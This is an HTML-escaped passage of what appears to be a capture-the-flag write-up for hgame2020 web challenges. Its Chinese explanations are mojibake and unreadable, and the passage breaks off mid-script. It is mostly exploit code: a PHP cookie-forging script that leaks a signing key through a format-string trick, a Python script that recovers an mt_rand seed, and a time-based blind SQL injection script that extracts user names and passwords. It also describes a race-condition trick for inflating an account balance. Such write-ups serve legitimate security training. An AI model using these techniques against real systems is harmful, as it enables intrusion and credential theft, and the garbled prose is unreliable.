&lt;p&gt;äºæ˜¯æ‰¾ä¸€ä¸‹gameç±»ï¼Œå…¶ä¸­rankåœ¨__constructæ–¹æ³•ä¸­ï¼Œæ–°å»ºçš„Rankç±»ï¼Œè€ŒRankç±»ä¸­çš„rankç”±__constructæ–¹æ³•åˆ›å»ºï¼Œæ¥è‡ªsessionæˆ–è€…ç›´æ¥éšæœºï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥è®©rank=1ï¼Œä½†æ˜¯å‘ç°æœ‰__destructæ–¹æ³•æ¥åˆ¤æ–­Rankç±»æ˜¯ä¸æ˜¯æœåŠ¡å™¨å®šä¹‰çš„ï¼Œä½†æ˜¯è¿™é‡Œå¯ä»¥åˆ©ç”¨constructå‡½æ•°å®šä¹‰$this-&amp;gt;key = &amp;amp;$this-&amp;gt;severKeyæ¥ç»•è¿‡ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾ååºåˆ—åŒ–çš„ç‚¹ï¼Œå‘ç°åœ¨Monsterç±»ä¸­å­˜åœ¨ååºåˆ—åŒ–çš„ç‚¹ï¼Œä½†æ˜¯æ˜¯é€šè¿‡cookieçš„æ–¹å¼ä¼ å…¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦æƒ³åŠæ³•æ„é€ ç¬¦åˆçš„cookieæ¥å°†payloadä¼ å…¥ï¼Œè¿™é‡Œå°±éœ€è¦çŸ¥é“encryptKeyæ˜¯å¤šå°‘ï¼Œè€ŒencryptKeyæ˜¯ç”±å‚æ•°ä¼ å…¥çš„ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt; = [&lt;span class=&#34;hljs-variable&#34;&gt;$playerName&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;encryptKey];&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;init&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;foreach&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt; =&amp;gt; &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;)&amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;welcomeMsg = sprintf(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;welcomeMsg, &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;sign .= md5(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;sign . &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å…¶ä¸­foreachç”¨æ³•ï¼š&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/1.png&#34; alt=&#34;1&#34;&gt;&lt;br&gt;ä»¥åŠsprintfç”¨æ³•ï¼š&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/2.png&#34; alt=&#34;2&#34;&gt;&lt;br&gt;ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†playernameèµ‹å€¼ä¸º%så°±å¯ä»¥å¾ªç¯çš„å°†ç¬¬äºŒä¸ªå€¼è¾“å‡ºï¼Œæ‹¿åˆ°encryptKeyã€‚&lt;br&gt;expï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Rank&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$rank&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$serverKey&lt;/span&gt;;     &lt;span class=&#34;hljs-comment&#34;&gt;// æœåŠ¡å™¨çš„ Key&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt;;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;key = &amp;amp;&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;serverKey;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Rank();&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$encryptKey&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$playername&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt; = [&lt;span class=&#34;hljs-variable&#34;&gt;$playername&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$encryptKey&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;foreach&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt; =&amp;gt; &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;)&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt; .= md5(&lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt; = md5(serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;) . &lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt; = base64_encode(serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;) . &lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt;;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ”¹ä¸€ä¸‹cookieå°±æ‹¿åˆ°äº†flag&lt;/p&gt;
&lt;h2 id=&#34;äºŒå‘å…¥é­‚&#34;&gt;&lt;a href=&#34;#äºŒå‘å…¥é­‚&#34; class=&#34;headerlink&#34; title=&#34;äºŒå‘å…¥é­‚&#34;&gt;&lt;/a&gt;äºŒå‘å…¥é­‚&lt;/h2&gt;&lt;p&gt;æ‰“å¼€é¢˜ç›®ä¸€è„¸æ‡µé€¼ï¼Œä¸çŸ¥é“åœ¨å¹²ä»€ä¹ˆï¼Œä¹Ÿä¸çŸ¥é“è¦å¹²ä»€ä¹ˆï¼Œçœ‹äº†WPæ‰çŸ¥é“å¥½åƒæ˜¯è¦é€šè¿‡ç”Ÿæˆçš„éšæœºæ•°æ¥è¿˜åŸseedï¼Œéš¾æ€ªå›¾ç‰‡è¯´èµ¶å¿«äº¤å‡ºç§å­ã€‚ã€‚æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥æ‹¿åˆ°seedï¼Œä¸€ç§æ˜¯é€šè¿‡å¾—çŸ¥&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä»mt_rand()è·å–2ä¸ªå€¼ï¼šR000ä»¥åŠR227ï¼Œä¸­é—´é—´éš”226ä¸ªå€¼ï¼›æ­¤å¤–è¿˜éœ€çŸ¥é“R000ä¹‹å‰å·²ç”Ÿæˆçš„å€¼çš„ä¸ªæ•°ï¼ˆç”¨iè¡¨ç¤ºï¼‰ï¼›&lt;/li&gt;
&lt;li&gt;æ ¹æ®è¿™äº›å€¼ç®—å‡ºåŠ æ‰°çŠ¶æ€å€¼ï¼›&lt;/li&gt;
&lt;li&gt;å¼‚æˆ–è¿™äº›çŠ¶æ€å€¼ï¼Œæ¨æµ‹å‡ºåŸå§‹çš„çŠ¶æ€å€¼ï¼ˆs228ï¼‰ï¼›&lt;/li&gt;
&lt;li&gt;æ ¹æ®s228ï¼Œæ¨æµ‹å‡ºs0ï¼Œè·å–ç§å­ã€‚&lt;br&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/196831&#34;&gt;https://www.anquanke.com/post/id/196831&lt;/a&gt;&lt;br&gt;è¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡phpçš„php_mt_seedå‡½æ•°ç›´æ¥çˆ†ç ´seed&lt;br&gt;&lt;a href=&#34;https://www.freebuf.com/vuls/192012.html&#34;&gt;https://www.freebuf.com/vuls/192012.html&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æ”¾ä¸€ä¸ªç½‘ä¸Šçš„expï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;import requests&lt;br&gt;import os&lt;br&gt;s = requests&lt;span class=&#34;hljs-selector-class&#34;&gt;.session&lt;/span&gt;()&lt;br&gt;url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;https://twoshot.hgame.n3ko.co/random.php?times=228&amp;quot;&lt;/span&gt;&lt;br&gt;cookie = &amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;PHPSESSID&amp;#x27;&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;lf08on0tsqpggqqvulpsg278h1&amp;#x27;&lt;/span&gt;&amp;#125;&lt;br&gt;c = s&lt;span class=&#34;hljs-selector-class&#34;&gt;.get&lt;/span&gt;(url,cookies = cookie)&lt;br&gt;ans = str(c.text)&lt;br&gt;ans = eval(ans)&lt;br&gt;R0 = ans&lt;span class=&#34;hljs-selector-attr&#34;&gt;[0]&lt;/span&gt;&lt;br&gt;R227 = ans&lt;span class=&#34;hljs-selector-attr&#34;&gt;[227]&lt;/span&gt;&lt;br&gt;req = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;python reverse_mt_rand.py &amp;#x27;&lt;/span&gt;+str(R0)+&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt;+str(R227)+&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; 0 0&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt; = os&lt;span class=&#34;hljs-selector-class&#34;&gt;.popen&lt;/span&gt;(req)&lt;br&gt;x = &lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;hljs-selector-class&#34;&gt;.read&lt;/span&gt;()&lt;br&gt;&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;hljs-selector-class&#34;&gt;.close&lt;/span&gt;()&lt;br&gt;x = str(x&lt;span class=&#34;hljs-selector-class&#34;&gt;.replace&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;))&lt;br&gt;url2 = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;https://twoshot.hgame.n3ko.co/verify.php&amp;quot;&lt;/span&gt;&lt;br&gt;data = &amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ans&amp;quot;&lt;/span&gt;:x&amp;#125;&lt;br&gt;final = s&lt;span class=&#34;hljs-selector-class&#34;&gt;.post&lt;/span&gt;(url = url2,cookies = cookie,data = data)&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(final.text)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;Cosmosçš„äºŒæ‰‹å¸‚åœº&#34;&gt;&lt;a href=&#34;#Cosmosçš„äºŒæ‰‹å¸‚åœº&#34; class=&#34;headerlink&#34; title=&#34;Cosmosçš„äºŒæ‰‹å¸‚åœº&#34;&gt;&lt;/a&gt;Cosmosçš„äºŒæ‰‹å¸‚åœº&lt;/h2&gt;&lt;p&gt;æ¡ä»¶ç«äº‰çš„é¢˜ç›®ï¼Œç”¨burpå‘åŒ…ï¼Œä¹°å…¥æ¯”å–å‡ºå°‘ä¸€äº›ï¼Œåˆ·ä½™é¢&lt;/p&gt;
&lt;h2 id=&#34;Cosmosçš„ç•™è¨€æ¿-2&#34;&gt;&lt;a href=&#34;#Cosmosçš„ç•™è¨€æ¿-2&#34; class=&#34;headerlink&#34; title=&#34;Cosmosçš„ç•™è¨€æ¿-2&#34;&gt;&lt;/a&gt;Cosmosçš„ç•™è¨€æ¿-2&lt;/h2&gt;&lt;p&gt;å‘ç°åˆ é™¤ç•™è¨€éƒ¨åˆ†å­˜åœ¨sqlæ³¨å…¥ï¼Œç”±äºæ²¡æœ‰å›æ˜¾ï¼Œåªèƒ½ç›²æ³¨&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ—¶é—´ç›²æ³¨è„šæœ¬ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight n1ql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs n1ql&#34;&gt;import requests&lt;br&gt;import time&lt;br&gt;&lt;br&gt;url = &amp;quot;http://139.199.182.61:19999/index.php?method=&lt;span class=&#34;hljs-keyword&#34;&gt;delete&lt;/span&gt;&amp;amp;delete_id=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;test = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;()&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;schema = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;schema_name&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;information_schema.schemata&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;table = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;group_concat(table_name)&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;information_schema.tables&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;table_schema=&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;()&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;column = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;group_concat(column_name)&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;information_schema.columns&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;table_name=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;user&amp;#x27;&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;data = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;concat_ws(&lt;span class=&#34;hljs-number&#34;&gt;0x5e&lt;/span&gt;,name,&lt;span class=&#34;hljs-keyword&#34;&gt;password&lt;/span&gt;)&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;babysql.&lt;span class=&#34;hljs-keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt;&lt;span 